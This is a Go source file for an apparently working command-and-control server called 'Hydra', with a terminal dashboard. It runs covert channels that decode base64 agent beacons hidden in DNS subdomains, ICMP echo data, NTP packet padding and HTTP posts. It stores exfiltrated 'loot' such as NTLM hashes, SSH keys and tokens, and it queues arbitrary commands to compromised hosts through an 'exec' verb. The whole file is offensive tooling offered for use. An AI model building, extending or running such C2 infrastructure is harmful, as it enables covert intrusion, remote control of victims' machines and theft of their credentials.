package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/gdamore/tcell/v2"
	"github.com/gin-gonic/gin"
	"github.com/miekg/dns"
	"github.com/rivo/tview"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// --- CONFIGURATION & STATE ---
const (
	rootDomain  = "c2.hydra-worm.local."
	historyFile = ".hydra_history"
)

var (
	taskMutex    sync.Mutex
	agentTasks   = make(map[string]string)
	agentMutex   sync.Mutex
	activeAgents = make(map[string]*Telemetry)

	// Vault Storage
	lootMutex sync.Mutex
	vault     []Loot

	// UI Metrics
	lastRTT       int
	currentJitter int

	// Command History & Autocomplete
	cmdHistory    []string
	historyIdx    = -1
	knownCommands = []string{"exec", "tasks", "loot", "clear", "exit"}

	// UI Components
	app          *tview.Application
	agentLog     *tview.TextView
	agentList    *tview.Table
	cmdInput     *tview.InputField
	statusFooter *tview.TextView

	// Spinner
	spinnerIdx    = 0
	spinnerFrames = []string{"▰▱▱▱▱", "▰▰▱▱▱", "▰▰▰▱▱", "▰▰▰▰▱", "▰▰▰▰▰", "▱▰▰▰▰", "▱▱▰▰▰", "▱▱▱▰▰", "▱▱▱▱▰"}
)

type Telemetry struct {
	AgentID         string  `json:"a"`
	Transport       string  `json:"t"`
	Status          string  `json:"s"`
	Lambda          float64 `json:"l"`
	Hostname        string  `json:"h"`
	Username        string  `json:"u"`
	OS              string  `json:"o"`
	EnvContext      string  `json:"e"`
	ArtifactPreview string  `json:"p"`
	DefenseProfile  string  `json:"d"`
	LastSeen        time.Time
}

type Loot struct {
	AgentID   string
	Category  string // NTLM, SSH, TOKEN, ENV
	Data      string
	Timestamp time.Time
}

// --- NETWORK LOGIC & HEARTBEAT ---

func LogHeartbeat(transport string, t Telemetry) {
    arrival := time.Now()
    t.Transport = transport
    t.LastSeen = arrival

    // Capture if this is new intel
    isNewLoot := IngestLoot(t)

    agentMutex.Lock()
    _, alreadyKnown := activeAgents[t.AgentID]
    activeAgents[t.AgentID] = &t
    agentMutex.Unlock()

    app.QueueUpdateDraw(func() {
        // ... (Metrics calculation remains the same) ...
        rtt := int(time.Since(arrival).Microseconds())
        if lastRTT != 0 {
            diff := rtt - lastRTT
            if diff < 0 { diff = -diff }
            currentJitter = diff
        }
        lastRTT = rtt

        refreshAgentTable()
        ts := arrival.Format("15:04:05")

        if strings.HasPrefix(t.ArtifactPreview, "OUT:") {
            fmt.Fprintf(agentLog, "[%s] [black:lightgreen][ MISSION RESULT ][-:-] [blue]%s[white]: %s\n",
                ts, t.AgentID, t.ArtifactPreview[4:])
        } else if isNewLoot {
            // ONLY log loot if it was unique
            fmt.Fprintf(agentLog, "[%s] [black:yellow][ LOOT ACQUIRED ][-:-] [blue]%s[white] exfiltrated unique credentials\n",
                ts, t.AgentID)
        } else if !alreadyKnown {
            fmt.Fprintf(agentLog, "[%s] [blue]NODE_JOIN[white] %s established via %s\n",
                ts, t.AgentID, transport)
        }
        // Routine "WAIT" heartbeats or duplicate loot are now completely silent.
    })
}

// --- UPDATED LOOT INGESTION (DEDUPLICATED) ---

func IngestLoot(t Telemetry) bool {
    if strings.HasPrefix(t.ArtifactPreview, "LOOT:") {
        parts := strings.SplitN(t.ArtifactPreview, ":", 3)
        if len(parts) == 3 {
            category := parts[1]
            data := parts[2]

            lootMutex.Lock()
            defer lootMutex.Unlock()

            // Check for existing entry
            for _, item := range vault {
                if item.AgentID == t.AgentID && item.Category == category && item.Data == data {
                    return false // Duplicate data, do not alert
                }
            }

            vault = append(vault, Loot{
                AgentID:   t.AgentID,
                Category:  category,
                Data:      data,
                Timestamp: time.Now(),
            })
            return true // NEW unique loot saved
        }
    }
    return false
}

// --- LISTENER PROTOCOLS (ICMP, DNS, NTP) ---

func parseHydraDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true
	for _, q := range r.Question {
		rawName := strings.TrimSuffix(q.Name, ".")
		cleanRoot := strings.TrimSuffix(rootDomain, ".")
		if strings.HasSuffix(strings.ToLower(rawName), strings.ToLower(cleanRoot)) {
			payloadPart := rawName[:len(rawName)-len(cleanRoot)-1]
			encodedPayload := strings.ReplaceAll(payloadPart, ".", "")
			normalized := strings.ReplaceAll(encodedPayload, "-", "+")
			normalized = strings.ReplaceAll(normalized, "_", "/")
			for len(normalized)%4 != 0 {
				normalized += "="
			}
			decoded, err := base64.RawURLEncoding.DecodeString(encodedPayload)
			if err != nil {
				decoded, _ = base64.StdEncoding.DecodeString(normalized)
			}
			if decoded != nil {
				var t Telemetry
				if err := json.Unmarshal(decoded, &t); err == nil {
					LogHeartbeat("DNS (Tier 6)", t)
					rr, _ := dns.NewRR(fmt.Sprintf("%s 60 IN A 127.0.0.1", q.Name))
					msg.Answer = append(msg.Answer, rr)
				}
			}
		}
	}
	w.WriteMsg(msg)
}

func StartIcmpListener() {
	conn, _ := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	for {
		rb := make([]byte, 1500)
		n, peer, _ := conn.ReadFrom(rb)
		msg, _ := icmp.ParseMessage(1, rb[:n])
		if msg != nil && msg.Type == ipv4.ICMPTypeEcho {
			body, _ := msg.Body.Marshal(1)
			if len(body) > 4 {
				processRawPayload(body[4:], peer.String(), "ICMP (Tier 4)")
			}
			echoBody := msg.Body.(*icmp.Echo)
			reply := icmp.Message{
				Type: ipv4.ICMPTypeEchoReply, Code: 0,
				Body: &icmp.Echo{ID: echoBody.ID, Seq: echoBody.Seq, Data: []byte("HYDRA_ACK")},
			}
			mb, _ := reply.Marshal(nil)
			conn.WriteTo(mb, peer)
		}
	}
}

func StartNtpListener() {
	addr, _ := net.ResolveUDPAddr("udp", ":123")
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	for {
		buf := make([]byte, 1500)
		n, remoteAddr, err := conn.ReadFromUDP(buf)
		if err != nil {
			continue
		}
		if n >= 48 {
			processRawPayload(buf[48:n], remoteAddr.String(), "NTP (Tier 5)")
			response := make([]byte, 48+5)
			copy(response[0:48], buf[0:48])
			copy(response[48:], []byte("T-ACK"))
			conn.WriteToUDP(response, remoteAddr)
		}
	}
}

func processRawPayload(data []byte, peer string, tier string) {
	rawStr := strings.ReplaceAll(string(data), ".", "")
	decoded, _ := base64.RawURLEncoding.DecodeString(rawStr)
	if decoded == nil {
		decoded, _ = base64.StdEncoding.DecodeString(rawStr)
	}
	if decoded != nil {
		var t Telemetry
		if err := json.Unmarshal(decoded, &t); err == nil {
			LogHeartbeat(tier, t)
		}
	}
}

// --- UI HELPERS ---

func refreshAgentTable() {
	agentList.Clear()
	// RE-NAMED HEADERS FOR TOTAL REALITY
	headers := []string{"AGENT ID", "TRANSPORT", "IDENTITY", "DEFENSE", "LATENCY (µs)"}
	for c, h := range headers {
		agentList.SetCell(0, c, tview.NewTableCell("[black:blue] "+h+" ").SetSelectable(false).SetAlign(tview.AlignCenter))
	}

	agentMutex.Lock()
	keys := make([]string, 0, len(activeAgents))
	for k := range activeAgents {
		keys = append(keys, k)
	}
	sort.Strings(keys)

	for r, k := range keys {
		t := activeAgents[k]
		agentList.SetCell(r+1, 0, tview.NewTableCell("[blue]"+t.AgentID))
		agentList.SetCell(r+1, 1, tview.NewTableCell(t.Transport))
		agentList.SetCell(r+1, 2, tview.NewTableCell(fmt.Sprintf("%s@%s", t.Username, t.Hostname)))
		agentList.SetCell(r+1, 3, tview.NewTableCell("[red]"+t.DefenseProfile))
		agentList.SetCell(r+1, 4, tview.NewTableCell(fmt.Sprintf("%d µs", lastRTT)))
	}
	agentMutex.Unlock()
}

func handleCommand(cmd string) {
	ts := time.Now().Format("15:04:05")
	fields := strings.Fields(cmd)
	if len(fields) == 0 {
		return
	}

	switch strings.ToLower(fields[0]) {
	case "exec":
		if len(fields) < 3 {
			fmt.Fprintf(agentLog, "[%s] [red]ERROR:[white] Usage: exec <ID> <CMD>\n", ts)
			return
		}
		targetID := fields[1]
		command := strings.Join(fields[2:], " ")
		taskMutex.Lock()
		agentTasks[targetID] = command
		taskMutex.Unlock()
		fmt.Fprintf(agentLog, "[%s] [yellow]AUTH_CHECK >[white] Objective Queued for %s: %s\n", ts, targetID, command)
	case "tasks":
		taskMutex.Lock()
		fmt.Fprintf(agentLog, "[%s] [blue]QUEUE_DUMP:[white]\n", ts)
		for id, c := range agentTasks {
			fmt.Fprintf(agentLog, "  - %s -> %s\n", id, c)
		}
		taskMutex.Unlock()
	case "loot":
		lootMutex.Lock()
		if len(vault) == 0 {
			fmt.Fprintf(agentLog, "[%s] [yellow]VAULT_EMPTY:[white] No credentials exfiltrated.\n", ts)
		} else {
			fmt.Fprintf(agentLog, "[%s] [blue]SECURE_VAULT_ACCESS:[white]\n", ts)
			for _, item := range vault {
				fmt.Fprintf(agentLog, "  [cyan]%s[white] | [yellow]%s[white] | %s\n",
					item.AgentID, item.Category, item.Data)
			}
		}
		lootMutex.Unlock()
	case "clear":
		agentLog.Clear()
	case "exit":
		initiateShutdown()
	default:
		fmt.Fprintf(agentLog, "[%s] [red]COMMAND FAILURE:[white] [%s] is not a valid tactical verb.\n", ts, fields[0])
	}
}

func initiateShutdown() {
	agentLog.Clear()
	fmt.Fprintf(agentLog, "[red:black:b]!!! INITIATING SCORCHED EARTH PROTOCOL !!![white]\n")
	go func() {
		steps := []string{"Destroying RSA Keypairs...", "Flushing Signal Buffers...", "Dismantling Covert Channels...", "Hardware Halt."}
		for _, step := range steps {
			time.Sleep(200 * time.Millisecond)
			app.QueueUpdateDraw(func() { fmt.Fprintf(agentLog, "[red]SHUTDOWN:[white] %s\n", step) })
		}
		time.Sleep(300 * time.Millisecond)
		app.Stop()
	}()
}

// --- MAIN ENGINE ---

func main() {
	app = tview.NewApplication()

	// Load history from file 
	if data, err := os.ReadFile(historyFile); err == nil {
		cmdHistory = strings.Split(strings.TrimSpace(string(data)), "\n")
	}

	// 1. HEADER
	header := tview.NewTextView().SetDynamicColors(true).SetTextAlign(tview.AlignCenter).
		SetText(`[blue:black:b]
   █  █ █▀▀▄ █▀▀▄ █▀▀▄ ▄▀▀▄      █ █  ▄▀▀▄ █▀▀▄ █▀▄▀█      ▄▀▀▀  ▄▀▀▄ 
   █▀▀█ █  █ █  █ █▄▄▀ █▄▄█ ▀▀   █ █  █  █ █▄▄▀ █ █ █     █     █▄▄█ 
   █  █ █▄▄▀ █▄▄▀ █  █ █  █      ▀▄▀  ▀▄▄▀ █  █ █   █      ▀▄▄▄ █  █ 
[white]────────────────────────────────────────────────────────────────────────
[yellow]STATION: COVERT_NODE_B64 | [blue]OSINT LINK: ESTABLISHED[white]
[green]TIER-1: ONLINE | TIER-2: ONLINE | [red]THREAT LEVEL: CRITICAL[white]`)

	// 2. AGENT TABLE
	agentList = tview.NewTable().SetBorders(false)
	agentList.SetTitle(" [blue]ACTIVE_SPECTRUM[white] ").SetBorder(true).SetBorderColor(tcell.GetColor("blue"))
	refreshAgentTable()

	// 3. ENCRYPTED LOGS
	agentLog = tview.NewTextView().SetDynamicColors(true).SetWordWrap(true).SetChangedFunc(func() {
		app.Draw()
		agentLog.ScrollToEnd()
	})
	agentLog.SetTitle(" [white]ENCRYPTED TRANSMISSIONS[white] ").SetBorder(true).SetBorderColor(tcell.GetColor("green"))

	// 4. STATUS & INPUT
	statusFooter = tview.NewTextView().SetDynamicColors(true)

	cmdInput = tview.NewInputField().
		SetLabel("[blue]HYDRA/INT> [white]").
		SetFieldBackgroundColor(tcell.ColorBlack)
	cmdInput.SetBorder(true).SetBorderColor(tcell.GetColor("blue"))

	// --- INPUT CAPTURE: HISTORY & AUTOCOMPLETE --- 
	cmdInput.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		switch event.Key() {
		case tcell.KeyUp:
			if len(cmdHistory) > 0 {
				if historyIdx == -1 {
					historyIdx = len(cmdHistory) - 1
				} else if historyIdx > 0 {
					historyIdx--
				}
				cmdInput.SetText(cmdHistory[historyIdx])
			}
			return nil
		case tcell.KeyDown:
			if historyIdx != -1 && historyIdx < len(cmdHistory)-1 {
				historyIdx++
				cmdInput.SetText(cmdHistory[historyIdx])
			} else {
				historyIdx = -1
				cmdInput.SetText("")
			}
			return nil
		case tcell.KeyTab:
			current := cmdInput.GetText()
			for _, cmd := range knownCommands {
				if strings.HasPrefix(cmd, current) {
					cmdInput.SetText(cmd)
					break
				}
			}
			return nil
		}
		return event
	})

	cmdInput.SetDoneFunc(func(key tcell.Key) {
		if key == tcell.KeyEnter {
			text := cmdInput.GetText()
			if text != "" {
				handleCommand(text)
				// Persistent History Save 
				cmdHistory = append(cmdHistory, text)
				f, _ := os.OpenFile(historyFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				f.WriteString(text + "\n")
				f.Close()
			}
			cmdInput.SetText("")
			historyIdx = -1
		}
	})

	// LAYOUT
	flex := tview.NewFlex().SetDirection(tview.FlexRow).
		AddItem(header, 9, 1, false).
		AddItem(tview.NewFlex().AddItem(agentList, 45, 1, false).AddItem(agentLog, 0, 2, false), 0, 4, false).
		AddItem(statusFooter, 1, 1, false).
		AddItem(cmdInput, 3, 1, true)

	// LISTENERS
	go StartIcmpListener()
	go StartNtpListener()
	go func() {
		dns.HandleFunc(rootDomain, parseHydraDNS)
		dns.ListenAndServe(":53", "udp", nil)
	}()

	gin.SetMode(gin.ReleaseMode)
	r := gin.New()
	r.POST("/api/v1/cloud-mock", func(c *gin.Context) {
		if c.GetHeader("Authorization") != "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9" {
			c.JSON(401, gin.H{"error": "Unauthorized"})
			return
		}
		var t Telemetry
		if err := c.ShouldBindJSON(&t); err == nil {
			LogHeartbeat("CLOUD (Tier 1)", t)
			taskMutex.Lock()
			task := "WAIT"
			if cmd, exists := agentTasks[t.AgentID]; exists {
				task = cmd
				delete(agentTasks, t.AgentID)
			}
			taskMutex.Unlock()
			c.JSON(200, gin.H{"status": "cloud_verified", "task": task, "epoch": time.Now().Unix()})
		}
	})
	r.POST("/api/v1/heartbeat", func(c *gin.Context) {
		var t Telemetry
		if err := c.ShouldBindJSON(&t); err == nil {
			LogHeartbeat("HTTPS (Tier 2)", t)
			c.JSON(200, gin.H{"status": "ok", "task": "NOP", "epoch": time.Now().Unix()})
		}
	})
	go r.Run(":8080")

	// STATUS REFRESHER (Using Real-Time Metrics) 
	go func() {
		for {
			time.Sleep(250 * time.Millisecond)
			app.QueueUpdateDraw(func() {
				spinnerIdx = (spinnerIdx + 1) % len(spinnerFrames)
				ts := time.Now().Format("15:04:05")
				// RE-NAMED FOOTER FOR CONSISTENCY
				statusFooter.SetText(fmt.Sprintf(
					" [blue]SYNCING %s [white]| [yellow]T_STAMP: %s | [red]LATENCY: %d µs [white]| [magenta]JITTER: %d µs [white]| [blue]ENCRYPTION: AES-256-GCM",
					spinnerFrames[spinnerIdx], ts, lastRTT, currentJitter))
			})
		}
	}()

	if err := app.SetRoot(flex, true).EnableMouse(true).Run(); err != nil {
		panic(err)
	}
}